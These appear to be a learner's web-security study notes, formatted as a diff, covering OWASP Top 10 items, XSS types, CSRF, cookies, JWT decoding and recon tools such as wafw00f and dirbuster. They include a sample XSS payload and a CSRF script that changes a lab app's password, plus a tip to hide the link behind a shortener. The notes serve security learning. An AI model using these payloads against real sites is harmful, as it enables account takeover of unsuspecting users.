+- https://www.shodan.io/report/89bnfUyJ
+
+EX: OpenVAS
+
+How to fix it:
+- *Remove unneeded components/dependencies
+- *Use tooling to automate version management
+- Try and only use legitimate libraries that can be trusted
+- Hava a policy/process for unmaintained components
+- Deply additional controls for protection
+- Use sandboxing
+- *Use consistent environments eg. using continuous Deployment
+- Consider SaaS to pass management to a cloud provider
+
+A10: Insufficient Logging & Monitoring:
+- Insufficient logging and monitoring - related to missing or ineffective integration with incident response
+
+
+SANS Top 25
+https://www.sans.org/top25-software-errors/
+
+Good video to understand Burp suite:
+======================================
+https://www.youtube.com/watch?v=2_lswM1S264
+Ethical Hacking 101: Web App Penetration Testing - a full course for beginners
+- Web application firewall detection with WAFWOOF (firewall - CloudFlare)
+
+1.25 - XSS 
+
+- owaspbwa -- it has list of apps to test/understand security 
+- OWASP WebGoat - an app - with DOM based XSS
+
+***
+- CSS - injecting script in to the URL parameter to attach user of the site or to potential attack server side of the webapplication
+- 3 type
+ -Reflected
+ -Stored - attaching the input which will be-  stored in the DB
+   - best place to think of is blogs/comments
+ -DOM based - attack is at the client side - we can try this if we are using AJAX code
+     Ex: use input field and enter below following code:
+	<img src="" onerror="alert("hello world")">
+CSRF -- it's  an attack which makes end user to execute unwanted action on Wep application
+	- this actions can be any thing - login action - user has to be logged in
+Script to inject - CSRF - XML and JavaScript - works well
+<script>
+xmlhttp = XMLHttpRequest;
+xmlhttp.open('GET','http://localhost:3000/rest/user/change-password?new=pass123&repeat=pass123');
+xmlhttp.send()
+</script>
+
+use a link shotener = "bitfly", "googleShotener"
+
+Cookie Collection & Reverse Engineering
+-----------------
+3 type:
+1.session cookie
+2.permonent cookie
+3.third party cookie
+
+To decode Authentication token:
+--------------------------
+jsonwebtoken - decoder - tool to decode Authentication token
+
+Password hashing - MD5 Online - hashing
+
+HTTP attributes(Cookie stealing) and cookie security
+----------------------------------
+info on how to send cookies to attacker server - not explained but need to visit author site to know more
+
+Tool:
+- wafwoof -  information gathoring tool
+- dirbuster - to get the directory structure
+- hash-identifier -- to know the hash algorithm used
+
+Collection of video to understand hacking:
+-----------------------------------------------
+https://www.youtube.com/c/HackerSploit/videos
+
+Interview Question:
+1. how you will detect whethere Web Application is using firewall
+ - Ans - using WAFWOOF tool - information gathoring tool
+ex: wafwoof https://example.com
